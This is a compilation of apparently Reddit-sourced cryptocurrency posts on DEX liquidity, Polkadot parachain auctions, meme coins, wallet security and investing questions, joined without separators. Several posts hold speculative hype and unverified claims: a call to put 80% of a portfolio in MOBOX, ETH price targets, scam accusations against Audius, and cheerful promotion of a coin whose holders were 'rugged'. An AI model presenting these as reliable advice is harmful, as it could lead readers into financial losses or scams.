In the video, I will explain what is liquidity with a lot of examples and I will simplify it for you so you can level up your DEFI understanding.

We will look at the biggest decentralized exchange on Binance Smart Chain (BSC) which is PancakeSwap - in order to understand what it is.

The information in the video applies to any other DEX on any other blockchain (It works the same)...

Liquidity is one of the most important things in decentralized exchanges and without it, the DEX's actually doesn't worth anything.

The more liquidity decentralized exchanges have, the better prices the users are going to pay when swapping tokens and they will suffer less from price impact and slippage.

That's why most of the decentralized exchanges are "fighting" for liquidity by offering Yield Farm and Staking programs.

Basically, the war is between blockchains and decentralized exchanges, the one with the most amount of liquidity wins.

Imagine a decentralized exchange like a robot that holds tokens in pairs (for example Cake-BNB).

The robot in our story is a smart contract that it's is to preserve the same amount of BNB and Cake in the reserves.

Anytime someone is buying or selling cake to the contract (robot) he changes the balance and therefore the contract is giving the user a "worse price" for the swap (Slippage).

The bigger the swap, the bigger the slippage is gonna be. The more liquidity the "robot" has, the lower the slippage will be.

In this video, I am going to explain to you all these kinds of concepts in an easy way, so after watching the video you will finally understand what does liquidity means on decentralized exchanges and why it's so important.

Hope you like it, and lemme know if you have any questions.

Johnny.

  Hi everyone, Im new to the crypto market and my question is where can I buy crypto currency? I saw that crypto .com has lots of variety but crypto .com chart is too small and only on mobile devices same goes for EtoroX , may I ask can I use trading view as my chart analyzer and buy at crypto.com is that accurate? Might include stocks too.

My next question is if I want to buy a specific index for example S&amp;P 500,Nasdaq Trading 100, Is forex the one I should be buying? I heard many people say that S&amp;P is one of the best index funds  to invest in but do they mean forex or fixed time?

I just watched Bitboy on Pomps show and heard a few things that Im pretty sure were untrue, so maybe we can get some fact checking done here?

Ill start off

1. Bitboy said that hes never owned Shiba Inu yet Im fairly certain that he said hed bought some in one of his videos (right before the May crash iirc). Does anyone else remember that? Can anyone recall the exact video?

2. Bitboy said that hes never told anyone to buy Shiba or Dogecoin. He did, didnt he?

I think Ben lies so often that he genuinely cant even remember half of the stuff hes said. Personally, I hate all the facts he spouts and then casually explains that these are true because he has some high level contact that seems to be able to hand him secret information about the future that nobody else could possibly know or understand.

Binance kicked off the first round of the parachain slot auctions for the Polkadot ecosystem.

Every DOT owner and all those who consider becoming one can now start voting on the projects that aim to become a parachain.

Voting will lock your DOT token for \~716 days and slot auction voters will get rewarded with lock-up rewards in the form of the token of the project they voted for.

With binance starting a warm-up week there is also a small pre auction reward distributed for people that vote on the first slot auction on binance.

&amp;#x200B;

Here's a short overview of all the project that DOT holders will be able to vote on:

1. [Moonbeam](https://moonbeam.network/): A smart contract EVM parachain bridging Ethereum Solidity smart contracts to the Polkadot ecosystem
2. [Clover Finance](https://clover.finance): A blockchain ecosystem already bridges multiple chains and when deployed as parachain aims to become a multichain bridge with EVM, DeFi protocols etc. for the Polkadot ecosystem
3. [Astar Network](https://astar.network/): A multi-chain dApp Hub that aims to bridge Ethereum, Cosmos and other chain dApps and Layer 2 Scaling solutions to the Polkadot ecosystem
4. [Litentry](https://www.litentry.com/): A substrate based DID-Aggretation project that offers Identity management, Identity staking, decentralized identity storage aswell as other usecases that aim to give users control over their data.
5. [Manta Network](https://manta.network/): A substrate based zk-SNARK privacy protocol that aims to offer end to end privacy and anonymity by allowing users to create anonymous versions of tokens deployed on Polkadot and it's parachains. It also offers a anonymous Decentralized Exchange that allows users to trade anomized tokens and use them on corresponding anonymous DeFi protocols
6. [Bifrost Finance](https://bifrost.finance/): A DeFi protocol that aims to liquiditise staking tokens and create derivative versions allowing users to stake their tokens without loosing out on liquidity. F.e. Polkadot users will be able to stake their DOT tokens and get liquid vDOT tokens that they can then lend out in DeFi protocols
7. [Efinity](https://efinity.io/): A substrate based deflationary cross-chain NFT parachain developed by the folks behind Enjin. The project aims to become the go to blockchain for the NFT's, gaming and content creator space featuring smart contracts, fuel tanks a NFT launchpad, multisig wallets and more.
8. [Parallel Finance](https://parallel.fi/): A DeFi protocol that allows lending, leveraged staking, interest rate swaps and auctioned crowd loans
9. [Acala Network](https://acala.network/): A DeFi network that aims to become a liquidity hub of the Polkadot ecosystem. Acala is a Layer 1 smart contract capable network with EVM users to gain yield on their assets. The network allows users to pay gas fees in any token that is tradable on the network.

Eric Adams, the mayor-elect of NYC just said on Twitter he is going to take his first three paychecks in Bitcoin. After his promise to make NYC a crypto hub, this is a pretty strong follow-up action. Mayor of NYC taking his first paychecks not in US Dollar but in open, decentralized Bitcoin.

Also, as you guys know, he is part of the Democratic party. This is interesting too, as until now, Bitcoin (I think) has been at risk of becoming a partisan topic as it was mostly Republicans that endorsed Bitcoin.

Hey guys, I seriously got involved with crypto in August of this year. Since then, I've been reading and researching endlessly, with a major focus on building a long-term, utility-based portfolio. My portfolio is still relatively small (\~5k), but I'm consistently DCAing and trying to acquire more digital assets as I truly believe that a revolution is underway for the world's financial sector. 

With that said, I'd be happy to hear your thoughts on low-key, utility-based coins that in your opinion, have big potential in the upcoming months/years. I'm currently holding XRP, HBAR and QUANT. 

I've noticed that AMP has pumped pretty heavily in the last 24h and will buy in once this rally slows down. I've read up on the project and I definitely see the long-term potential of this coin - especially once consumer-merchant crypto transactions become mainstream. 

Which other hidden gems do you recommend I read up on? I find it especially hard to find good "hidden" crypto's to invest in before they start pumping. Only thing people seem to talk about are meme-coins, BTC and ETH.

Last week, the Mayor of Miami Francis Suarez said that he will be taking 100% of his next paycheck in Bitcoin.

Not to be outdone by this the newly elected Mayor of New York Eric Adams has said that he will be taking his first three paychecks fully in Bitcoin.

One of the main campaign promises of Eric Adams was to make New York the center of Bitcoin and compete with Miami to become the crypto and tech capital in the US.

Politicians are one upping each other and accelerating adoption. Texas, Wyoming, Miami and New York are all competing to attract miners and crypto talent to their state or city.

Anyone has seen this SLP total supply in the ronin is 13 Billion and with a market cap of 239M based on Coinmarketcap all we know the total supply of SLP in the coinmarketcap is outdated but the marketcap is updated.

I tried to compute the average price of SLP based on this info with (marketcap / total supply) = 0.0176 how come the price of SLP reach 0.117  when its needed 1B marketcap

Please correct me if im wrong any thoughts about this please share your idea

Total supply link
[total supply SLP](https://explorer.roninchain.com/token/ronin:a8754b9fa15fc18bb59458815510e40a12cd2014)

If you wanted to see my computation check it here
[Calculation](https://docs.google.com/spreadsheets/d/1tcxrN6BZN7YirzfLVaKi3t-z-ItJqMO2jFn4XKcdVIU/edit?usp=drivesdk)

And everyday the supply is getting higher and higher this might push SLP price down we are minting SLP millions and we burn some thousands only.

I am newish to crypto and currently using Coinbase Pro for trading and keeping my balance. Yes I know about the many bad opinions and experiences of some people. I have been reading a lot about offline wallets like Trezor, Nano, etc, but for various reasons (coin support, learning curve, trading ability, fear of personal user error, etc) Im skeptical about buying and using any of those.

Just wondering if there are people out there that keep everything in Coinbase or Coinbase Pro (even high value balances) and are not worried about it and havent had a bad experience? I know I will very likely get this no matter what, but there is no need to post about how bad they are. I've seen the many posts about that. Just wondering how many of the opposite experiences there are.

And if not Coinbase, is there a better solution for a US person that does what Coinbase and Coinbase Pro do together, or if not better close?

Im sure other people can understand where Im coming from when I say it.  Its very convenient to follow some of the crypto rules such as DCA, hodling, etc.

But for example, lets say I DCAd $50 into Bitcoin every week, for the past year.  While my average buy-in goes down, and Id make money over time, crypto isnt supposed to be treated as a savings account.  

Except for someone like me, and Im sure others who might struggle with money management, its hard to see that $50 just add up to a much larger number, and not pull it out. 

I get the whole Diamond-hands aspect of it, and Id like to think I do a good job at not selling/touching it.  I was just wondering if anyone else feels the same way or has any tips for not looking at their crypto portfolio as another bank account? Thanks!

Guys I see a lot of posts on here about "what-if". What if you invested, what if you didn't FOMO. What if you didn't get scammed. Life is full of looking back and "what-if's". I say don't look back, look forward and move forward. 

I've admittedly made a few really bad mistakes in crypto, but I learned and that's the price I pay to learn. Some of it was very stupid on my part. Being scammed on BTC cloud mining, ETH halving, at least three rug pools. I almost gave up,  but after a day or two of sulking and pulling money out. I went back in on ETH and staked it. Now I am in the green again.

My point is, we ALL have mistakes we make and we ALL miss out on opportunities that could have made us rich. Hell, I sold 1 billion of Shiba a few months back that would have me up 60k now. But I am proud of what I have done with my ETH since. I cut my losses and got back in the game and stopped messing around with every shiny token under the sun.

We are all truly so early. Don't chase pumps, or shitcoins with money you can't lose. Stick to a solid plan and HODL. Lets all try and be patient and our dreams will come to fruition. 

Now go buy the dip you filthy animals!

I keep seeing people blindly investing in projects. Unfortunately, in some cases even celebrities are endorsing scams now, causing confusion at best and huge investment risk at worst. 

One in particular that just simply blows my mind is AUDIUS, and its traded coin AUDIO. The premise of which is to be a competitor of Spotify.

Simply put, DO NOT INVEST IN THIS COIN!

How do I know that Audius is a scam?

1) When it was released, they never even bothered to announced their tokenomics and subsequent initial token distribution. Thats rightthey asked people to blindly invest in their platform without a formal economic structure in placethe sad part is, people STILL invested

2) laterAUDIUS did (finally) announce how the coins were distributed. But, not by posting it easily on their website, and making sure its accessible.it was buried and hidden from the community. They announced the tokenomics by way of (a very professional s/) [paid medium article](https://medium.com/audius/welcome-audio-to-mainnet-409009bc130c).no Im not kidding

Which, describes that the **vast majority** of the coins would/are owned by Audius. They did however take the time to call themselves 3 different names, to make it a little more confusing. 

Here, is a summary:

- 40.6% went to team (aka - audius team)
- 36% went to investors (aka - audius team)
- 17.8% went to Treasury (aka - audius team)
**in total that = 94.4% of distribution went to AUDIUS team**

Okay okay, I know what youre thinkingbut is that REALLY true?! How could the company be convincing major celebrities (like Zedd) to participate in this scam? Its simplepaid adoption. They pay these celebrities (that know nothing of tokenomics) to list on their platform. Its an easy $25k for them, and they barely  think about it again. All the while, Audius gets falsely portrayed as a legitimate investment, backed by celebrities. 

**Proof:**
- Top 10 Audius wallets hold **92.21%** of total supply
- Top 50 Audius wallets hold **96.29%** of total supply
- **96.9% of the total supply of Audius Is owned by the top 100 wallets ONLY**

I live in a country where we have almost no laws regarding cryptocurrencies, meaning that people show almost no interest in trading them or using them. Majority of them are not familiar with crypto at all.

Today I was driving to work and literally from 100 meters I saw something that caught my attention.

In my country, there is a hotel that accepts cryptocurrencies as a means of payment.

And not just any hotel, this is one of the most popular and most expensive residential complex that we have to offer to the tourist that are coming here on a summer vacations.

This is sure to sound silly to you all, but you have no idea how much this has excited me **and brightened my day.**

I literally have a feeling that only 1 in 10000 people here know what cryptocurrencies are and looks at it as something positive.

The others either don't know or **look at you like you're crazy if you tell them something about crypto, including most of my friends**.

**This literally brightened my day**, so I had to share it with you. Not to mention that the Minister of Finance is considering buying BTC. Adoption is closer day by day!

I've only been in crypto for a few months and have consolidated my portfolio to a small few *less risky* long-term holds (BTC, ETH, Algo, Matic). I've set aside roughly 10% of my total investment towards actually getting involved with and utilizing various crypto ecosystems rather than simply HODLING.

So far, my only venture into DeFi has been on Algorand due to the low fees &amp; fast transactions. I've accumulated Yieldly tokens via Tinyman AMM, which I've then staked for additional Yieldly at 45% + other interesting emerging Algorand projects with even higher APY's. Projecting based on current market prices, my annual ROI is over 50%.

I'm now looking to explore other similar opportunities on other blockchains. I'm currently doing my own research but want to hear from the community as well. I'm mainly looking at platforms that offer fast transactions with low costs. Harmony One, Fantom, Solana? I'm also willing to transfer some of my Matic and eat the initial gas cost if DeFi on Polygon is lucrative.

My long-term strategy is to invest in platforms similar to Yieldly, but on other blockchains. Being able to stake a platform's native token for other projects seems like a great way to be exposed to up-and-coming projects without directly investing fiat. The goal is not to find the next moonshot memecoin, but to get in early on exciting projects with a clear purpose.

What's your DeFi &amp; yield pool experience look like on other platforms? Shill it to me, baby.

Don't know if it's legit or not, If it is then this is truly amazing to get about 2 million with just 1k usd, Shiba inu has minted many millionaire and he is one them I guess. I've been in crypto for many years yet haven't gotten lucky like this guy and most likely won't, I don't have you know $1k to through into a meme token. He has diversified his portfolio, that's smart. Shiba inu ain't going to last forever, it's already dropping like a rock. 

Has anyone else here gotten lucky with Shiba inu or other meme tokens?

I have been working in a Pharmacy for the past like 6 years and my god... I have never been so stressed, so depressed and so out of place than I have ever been before in my life due to covid and personal problems.

&amp;#x200B;

I don't think I will be able to get myself to do this, but what would the cost be and the risk to just up and quitting the "daily grind" and start working for myself?  


Currently, I have a decent amount I've made off Crypto and NFTs, but that's just being casual and barely taking time to research, learn, invest more, etc.. its been just a thing that's on the side.  


I got a job offer with the government, which I'm waiting to get due to their extensive background checks... so that job SHOULD be significantly less stressful than it is now as a person who finds contracts for the US ARmy... but the pay isn't amazIng and its still a 9-5 job.

&amp;#x200B;

I can't be the only one seeing people quit their day jobs and become much happier and more sucessful, so I am asking this and opening up this discussion for myself and anyone else wanting to get out of the work force and open up their life .

With crypto popularity picking up in the mainstream again scams and malicious attacks are on the rise.

The safest thing is keeping your crypto offline.   Away from the internet.   You can even use trezors and ledgers on certain wallets as a u2f (Universal 2 factor authentication) for you folks holding tokens off the binance smart chain or any other.   Any withdrawals will need to be cleared by the connected device.   So keep it disconnected obviously and don't approve any transaction you didn't initiate.

See all the posts shilling things like new coins/tokens in telegram?   Sure some are just future rug pulls looking for subjects.  But some are legit malware.   See posts of people saying "woke up and my wallet is empty, here's the address it went to"  "the copy paste of my crypto address keeps changing"   malware is real.   All this can be avoided by keeping things offline or secure with a hardware wallet.  But even then, we don't want anything sleeping on our devices, even if no crypto is on there.   Use something like avg anti virus and or Malwarebytes.   Both are available in both app stores and their website.  Careful of the links you click.   Especially from new accounts with low karma.

Don't ever give your keys to anyone.   Support will never need it.  Wallets don't need synchronizing or validation or anything.   And if you think wallet insurance is real, it's not.   Never.    Never give your keys.   Don't take a screenshot, never digitize it or keep it in any cloud.  Caveman status.  Chisel that siht into a rock and bury it.  
 

There's more scams than you can ever imagine.   Hardware wallets start at roughly $60usd.  Buy from their websites only and make sure you set up the device and generate the keys yourself and any security codes.   If it comes with these already completed, do not use under any circumstance.  

And finally, turn off your dms, or know what's coming in them.

Cheers

I've mostly been a lurker here, suspect this might be my first actual posted question. 

In the process of reading an in depth article about BSV and the Wright vs Kleiman lawsuit, the following paragraph raised some questions about whether I understand "forks" correctly:

"Keep in mind that because BTC, BCH, and BSV are all forks of the same chain, Satoshis ~1.1M Bitcoin fortune would apply to all of these forks. In other words, Satoshi is suspected to have ~1.1M of each BTC ($66.5B total value), BCH ($0.65B total value), and BSV ($0.17B total value)."

Can someone ELI5 why this is accurate?

Since RVN and HVN are also forks of Bitcoin, would the same 1.1M apply to those chains? I assume this would also be true of any other BTC that existed prior to each of the BCH and BSV forks?

Please reduce my confusion

Alright, so I've got a little bit of money to put into some crypto for investment purposes and was wondering if BTC and ETH are obviously the safer of the two to put into, sit and hold for awhile? Perhaps FTT? And then any extra money afterwards would go into crypto for trading and what not. I know there is a lot of different things I could put my money into, and there are lots of things that seem to be just a grab. After seeing posts the last few days about the squid game coin I should obviously steer clear from that yes? Anyways, much appreciated for any information that could help on this matter.

I am trying to determine if it is worth buying crypto with a credit card (USA).   


As I understand it, I need to pay taxes on the gains. I have been thinking about dumping some bags of low performing coins or coins that I've lost with, like VET. So is it possible to buy $3000 in ETH with credit card, and slowly cash out these other coins to pay it off? Or am I better off just converting those coins to ETH on an exchange?   


I feel like we are in a bit of a bull run, i'm willing to take the risk

Thinking yet? Let me help you.

You should start playing blockchain games, because:

1. In contrast to usual video games you owe products you bought for your game. And blockchain controls all the operations;
2. You dont need to invest money to start earning;
3. You earn crypto;
4. Its only in your hands. Nobody can influence your chances to win. Its just you and your gaming skills: the better you play the more you earn (up to $3k);
5. There is trading too;
6. You have more possibilities to earn;
7. Competition is low. You can make a good profit just being professional;
8. DApps users number will be growing comparing to traders.

I understand that nobody really knows shit about fuck, but what's the theory regarding the plan of large institutions? Will they be selling for profit during the bull run, or are they all long term Hodlers as well?    
Do institutions view crypto as an inflation hedge, or are they just putting money into the casino and trying to time the market top just like traders?   
If they have no intention of selling then this time might actually be different, where every large drops just keeps getting bought back up, so hodling is the way to go. But if they all plan to sell, then it seems the best course of action is to DCA out at different percentages to at least pocket some gains near the top.

This is in response to another post where OP talks about $30T of wealth from boomers eventually being transferred to the next generation. OP tells us to be patient with our crypto investing and wait until the boomers give us money.

Get out of here with that trickle-down nonsense. Given everything we know about the boomer generation, do you honestly expect to get anything? The boomer generation is all about hoarding resources. They see the younger generations struggling with multiple jobs. What about owning a house or having enough extra money to raise family? Total fantasies. 

Boomers. Don't. Care. They insult us for our participation trophies. They mock us for being "woke." They tell us to stop eating avocado toast.

In fact, this whole narrative of, "just be patient, you'll get your opportunity someday," sounds exactly like something a boomer would say. Translated, it means, "Don't upset the status quo. That might threaten our power and wealth."  OP links to two articles articles about how millenials and gen z should be excited about receiving crumbs in the future. Unsurprisingly, the sources are from wealth services catered for boomers.

For the rest of us: If you want wealth, create your own wealth. If you think crypto is the way forward, then good luck. It might save us from the boomers.

Lastly, let's not be like the boomers when we get old. Should any of us acquire wealth beyond our means, please share with the next generation that comes after us. I like that one dad who created crypto wallets for his kids. They shouldn't have to suffer the way we did.

I've been here since like March or April and I dived in DEEP. I know more about POS and ETH/Harmony One that I do about most other subjects. It's been so fun for my brain. 


But, where should I go that's not this subreddit for more news and things going on in the crypto world? 


And before anyone asks, I don't care about moon farming for this post. Keep the upvotes at positive, but I'm sincerely interested in the responses y'all have. 


Love you all! Seriously, even though spaces can be toxic, and this place has the same issues as any other, we all agree that crypto is interesting. 


Thank you all! 

Filler filla the fillable spaces and this requirement is only sorta sensible, maybe make it a tweet length instead? 

Whooooo!


Yay!


More words!

Not sure if a post like this is allowed, but I was thinking it would be fun to take like $100 and put it into some brand new shitcoins and see what happens. I think asking here is probably better than randomly picking some and immediately getting scammed, so what are some interesting gambles and where do you buy them? Obviously nothing like squid where you can't even sell if you wanted to. And also please don't recommend any of the commonly shilled coins like ALGO, VET, etc. Those are boring. I want the risky shit.

When origin trail was added to coinbase, the difference between exchanges was huge, 2$ vs up to 6$ on coinbase, however i figured it was something to do with the hype, as it was a new listing.

However, i saw iotex pumping today, up to like 0.4 (over 200% increase), I didn't think anything of it as I don't own any, but now in the evening i went to check crypto.com for something else, and saw iotex is only up 20% for the day, peak at 0.15, i checked coinmarketcap, and all other exchanges were similar (0.15-0.18$)

I get that exchanges aren't just one single pool, but why is the price difference up to 3x, and who would actually buy it at such inflated prices?

What are your thoughts? Can Solana beat out tether and Bianance coin?

Solanas market cap currently sits at around $72 billion. If its to challenge Binance Coin for the number three spot, the SOL token will need to close the 30% gap between the two assets.

Solana has risen almost 17,000% percent, making it one of the best crypto investments of the year so far. The adoption of on Solana and growing total value locked in DeFi protocols such as Ravdium and Orca have contributed to the chains parabolic growth.

At a 4% cash back with seemingly no limitations, does this not put the Coinbase card into the discussion with other top tier reward cards? From what I know, getting 5% on every purchase is pretty much the goal when it comes to cash back, but you usually have to use different cards throughout to year to achieve this. The Coinbase card gives back 4% into an asset that typically appreciates as well which in my eyes is even better. 

Am I missing some or is this card starting to take aim at other credit/debit cards and actually make a statement?

As I browse today, I noticed something a little funny. On Coinbase, I see IoTeX up, immensely, trading at +$0.30. 

Hop on over to crypto.com and see that IoTeX is trading at a solid $0.13. What the heck? 

So, could anybody explain to me why this would be happening? Would I actually be purchasing for $0.13 cents on crypto.com or is this some kind of visual bug?

What would happen if:

**Person A (min)**: will try to approach 0 usd

**Person B (max)**: will try to go moon

If the way they trade is with the following rules:

* they both **start with 100k** usd.
* they can only have 1 type of currency (they need to **convert** ***all*** **100% of their something each time** to something, else)
* they must make **exactly 1 trade per day** and the same hour and leave it as it is for the next 24 hrs
* **only legit crypto**, lets say, only the crypto listed as available in coinbase or some other exchange
* the thing **is over after 10 days** or something and whoever increased their difference from the original 100k wins (person A wins if he lost more than person B gained, person B wins if he gained more than person A lost, otherwise it's a draw)

Logic tells me Person B will win more often, but I can see myself losing one of this contests being Person B so idk.

Just some silly thought experiment, similar to those questions if random picked stocks by a 3 year old can outperform VOO or something. The crypto world however, I think it is much more unpredictable than the stock market, so I think maybe Person A would win almost as equal than Person B?

You get to trade with the profits until the end of the year.

Short term taxes is your income tax rate but you don't pay social security or medicaid.

You get tax reductions on losing trades.

The government is the fiat reverse whale that people dont talk about enough.

Mansa Musa, the emperor of Mali in the 14th century, was perhaps the wealthiest person to ever live. Its hard to compare him to people like Elon Musk today, but estimates from a BBC article estimate him at $400bn in todays money. He was a devout Muslim, so when he took his pilgrimage to Mecca with his massive entourage he devalued currency in Cairo to the point where it took at least 12 years to recover. 

With governments printing money left and right, they are essentially doing the same thing. Investors love the markets being up like they are, but when you factor in the truckloads of money the government is pouring into the markets they arent actually as high as they seem to be. The great reverse whale is pulling the rug gradually, so that people who havent adopted crypto yet wont know what hit them until its too late and their currency has collapsed.

Lets not pretend like this will happen everywhere like some on here do. Itll probably be a small, already unstable country. But regardless of where you live, crypto takes the power out of the hands of the reverse whale. Its truly a currency you can trust (provided you do your homework of course).

Keep calm and BTC/ETH on

Seeing as there is a craze for dog related crypto at the moment, it got me thinking which Crypto I would associate with with which dog breed? (Silly I know, sorry). 

Bitcoin to me, as the OG, wise and regal crypto king that it is, would be a German Shepherd. Loyal, dependable and feisty when needed. (lol)

I suppose Ethereum would be a Cockapoo? It has really become popular in the past year or so, and the prices keep shooting up. I believe a Cockapoo also fits this position as it was originally chosen by the hipster crowd but is now you see them everywhere.

In third position - I'm not sure... I think this is where you wonderful people come in. Help me out. Which Crypto fits with each dog breed and why?

MOBOX (MBOX) is among the tokens that should make up to 80% of the portfolio of a prudent investor. Turkish crypto expert Enes Paradotor Turan announced this on Twitter.

The expert who has more than 650,000 Twitter followers believes that crypto investors need to pay attention to MBOX.

Colleagues of Enes Turan note that MBOX represents a promising segment of GameFi, the potential of which is far from fully disclosed.

Recall that MOBOX is a platform for crypto games and NFT. Crypto games have become extremely popular in 2021 and this is the main niche of MOBOX.

The "play to earn" game model rewards users for their time and actions in the game. The model has a chance to get a part of the global gaming market worth $175.8 billion which is expected to grow to more than $200 billion in 2024.

On October 12, Binance announced the creation of a $1 billion accelerator fund for the overall development of the BSC ecosystem. Popular games on its smart chain are MOBOX: NFT Farmer, Faraland, ZOO Crypto World and CryptoBlades.

MOBOX offers free games in which players can earn cryptocurrency in the form of MOBOX tokens. Non-reciprocal tokens (NFT) are a significant element of MOBOX. Players can use MOMO NFT, and they all have their own unique features. Players can purchase NFTs or unlock those randomly using KEY tokens, which are earned by placing MOBOX or other cryptocurrencies.

Since MOBOX is free to play, you should visit its website and try MOMO: Token Master if you are thinking about investing. You can get an idea of how it works and see if you think it will be successful.

Hello everyone, I've got a question for all the developers who have worked on multiple smart contract platforms, I'm a Software Engineering student who recently started learning about smart contracts, I've worked through Cryptozombies.io which teaches Solidity, and I'm starting an online blockchain specialization program at the university of Buffalo in January.

My first question is what smart contract platform is your favorite to work with and why?

and my second question is what language/path would be best to pursue? 

Solidity seems like the best way at the moment, but maybe Plutus could be more lucrative, hopefully if you're working in the industry you can point me in the right direction. Thank you.

Here is the list of largest big tech companies and their market evaluation: 

https://companiesmarketcap.com/tech/largest-tech-companies-by-market-cap/

Rapid growth of internet during late 90s and 2000s gave an incredible opportunity for many people, companies and countries. Global economical impact of internet is just unimaginable, it was fastest growing technology and an alien live form according to David Bowie - https://youtu.be/8tCC9yxUIdw

Crypto is growing twice as fast as internet and blockchain technology opens up even more opportunities: https://www.telegraph.co.uk/money/cryptocurrency-explained/blockchain-growing-faster-than-internet/

**Ethereum is open access to digital money and data-friendly services for everyone  no matter your background or location. It's a community-built technology behind the cryptocurrency ether (ETH) and thousands of applications you can use today.**(C) 

So basically Ethereum is: 
1. Decentralized platform to build applications on
2. Banking for everyone 
3. Private internet 
4. Peer to peer network 
5. Medium of exchange 
6. Equity 

There are various projects running on ETH right now, many more in the pipeline and network itself is being constantly improved. Gas fees are a bummer but if you compare with telecom, automobile industry, internet and so on - you will see that Ethereum going through classic scenario of being extremely promising but expensive to being global disruptive technology that is accessible to everyone. 

The new digital asset research team at Standard Chartered sees Ethereum going as high as $35,000 - https://news.bitcoin.com/standard-chartered-report-structurally-values-ethereum-at-26k-to-35k/

And how can you argue with that evaluation when you clearly see ETH being adopted world wide? All of those use cases combined can easily push the price beyond 35k level in the next 5-7 years. World is going to change drastically and its good to know that average Joe as me can be a part of that massive shift.

Do you sell for USD?

Do you HODL as BAT?

Or do you convert to BTC/ETH/some other coin?

For my part, I just sold about half of my BAT when it hit $1.30. I've accumulated like 50 BAT since starting using Brave, and I get about 5 BAT/month or thereabouts. I think my approach from now on, though, is to convert the BAT directly into BTC. The BAT/BTC and BAT/ETH valuations have not looked good at all, except in early 2021.

In the immortal words of Ben Cowen: "But what if it bleeds against Ethereum?"

About 200 characters short, so I'll just add that I like the concept of BAT as a project and Brave as a browser, but the fact that you can't accumulate rewards on iOS will seriously hinder adoption.

So the daily thread has always been pretty solid these last few months. Yeah you got spammers, moon farmers and people shilling their alt coin, but it provided for some solid discussions/comments. That is until the last week or two. Lately the daily has been shill central. 


SHIB was understandable because it was legit going parabolic and was easily the most interesting coin to talk about, it practically crashed the exchanges when it was at ATH and had more volume than BTC for a day.


But since SHIB calmed down (nice way to put it) a lot of people turned to other coins, particularly LRC. The last time I saw the daily thread I'd reckon that 80+% of the comments were some variation of "LRC!! LETS FUCKING GOOOOOOOOOO!!!!!" I'd reckon it actually had some affect on the price too, volume and the price has died down since.


Is that the reason the daily has been shut down for the last 24 hours or so? Kind of a shame to see the daily getting shut down because people are really hyped for a particular crypto and commenting too much.


I hope it comes back, there are so few unique active threads that this sub feels like a ghost town sometimes.

If you've been paying attention to meme coins you'll know that SHIB has lost over 15B in value in about one week. Within that same week FLOKI has been picking up billions. The shift in meme coins is upon us folks.

The only questions is how much total value will SHIB lose in the next few weeks. I'm not saying it'll crash to 0 but with FLOKI getting a pump, you have to wonder where that money is coming from. My guess, SHIB and DOGE (other meme coin) profits being funneled into FLOKI. 

Credo: Invest on fundamentals, gamble on memes. 

IS FLOKI the new SHIB?

Ladies and gentleman I welcome you to my imaginary world.

In my world each one of you have been granted the right to come up with a shitcoin idea. 

Will it be a blunder or a bussing project, choose your weapon wisely!

Find me the best excuses to buy your imaginary shitcoin. 

Whats its purpose? 

What it utilitizes on? 

Why its not a shit coin or meme coin but an actual coin. 

Why it is the future and what it does differently than other coins? 

Is it in eth blockchain or bnb or in other spaces?

Simply, i hated when i saw doge shib axs . hit into top 10. So i had to decide whether to stay rational in this irrational world and watch people making money or make that money.   

Because that everyone is rugged and 1 person won, i think this project full filled its objective as it was in the series, thats why I consider this as a success.


After the rugg there were no whales left. As it is the case with doge shib.

I already made a ton of money, but wont sell my holdings till this makes it to top 30. And yes, you can sell!

My other lost was removed for talking about a coin specifically, but it was more than just one coin sooo

My dad and uncle died of COVID complications in early October so I have paid almost no attention to any of my crypto. Now I see my $10 of of a coin (SHIB)I bought awhile back turned to $800+ and was a bit higher. 

I made far more with Doge early on, but I went conservative on many meme coins. Nice to see this one make a bit for me, still HODLin! I spent a few hundred on DOGE but thought putting a bit in many smaller coins could be fun. Now it is! For any new folks with means, play a bit! Buy a few crap coins just to see what happens. Coinbase even gives you free coin for short quizzes! I liken it to fantasy football. Get into it for cheap or free and FANTASIZE! Sure, your $5-$10 might become $1 or less, but dabbling forces you to learn a bit. This is a fun time to be in crypto!

How many in here hit it big with meme coins lately? I know some of you went a bit less conservative than I did!

Bitcoin is honestly 'a way out' of this system. Now that I think back of how I thought about money, fiat and banks a bit over a year ago I think of myself as so naive but I didn't know better either, and fact is that most people in the world are still hurt by inflation, and we're never truly 'separate' from it even if we purchase Bitcoin. But at least we're part of a group of people that have an alternative to fiat that will financially help them a lot, and I'm happy for all of us as long as we deal with this opportunity responsibly.

Someone mentioned that a cat meme coin - Catecoin - was finally starting to catch fire after the dog meme coins have been dominate for so long. I was curious and looked in on that coin at CMC, only to find that there is a whole slew of top trending, funnyass coin names that are up and coming. Reality has left the building lol. 

For example, according to CMC, some of the top trending coins and tokens are:

CumStar #2777

MarsRise #2994

ShibX #3179

DogeMoon #3118

ElonBalls #3306

I'm curious what other meme coins might be coming down the pipeline, so I wanted to throw that out there and see what you have come up with?

Wondering if anyone here is like me and thinking for years about transitioning into crypto full time. I am not a developer, more of a Sales and Sustainability career person. I work for an environmental services company that transforms food and beverage waste into renewable energy. That energy could certainly power a small scale mining operation, but thats not part of our current scope.

Im passionate about the environment and nature, and dont like contributing to climate change. Ive been picky in my career about what jobs I take and wanting my professional work to be aligned with my personal values.

My job / company might sound cool, and it is, but Im not being challenged or utilized effectively. Im in a silo, and dont see much upward mobility, so Im considering my options at this point.

Crypto is something Ive always been drawn to. I dont have a large stack, but Ive always wanted to learn more about the different projects and help the industry advance. I would love to transition to the crypto space, I have a lot of passion and excitement for it, and I can sell anything that Im really into. I think Id be great at a job, but I also cant afford to take a big cut in salary, so starting in an entry level position would be tough at this stage in life.

Wondering if anyone out there is like me, made a transition into the crypto space from another industry like environmental / business development. If so, what do you recommend, and are there any job sites or people out there that you recommend I start with?

Many thanks internet friends

as usual people lack the legal background to understand 6050I. This will do what I kept saying on reddit for 2 years....It forces non us citizen owner operator dev to force mandatory kyc on all people in the world who use the defi app, if they do not, the US will prosecute and extradite them on banking secrecy charges like they did Bitmex and Helix. Since the US has horrific regulations, it's a defacto ban on NFT and all of DeFi because nothing can be approved or marketed in the united states, our regulatory system is broken, everyone has to offer things in an unregulated grey market that avoids kyc to avoid regulation.....This will destroy american retail, and american angel investing, and the profit and utility premise of DeFi which will.....cause a bear market. United states venture capital funding DeFi tokens \*IS\* what drove this new bull market, it \*is\* what ended the last bear market.

IRS Forms to comply with 6050I are called 8300's and require KYC information from BOTH Parties, even in a TWO Party system, or a smart contract or automated market maker, \*with this new bill\*.

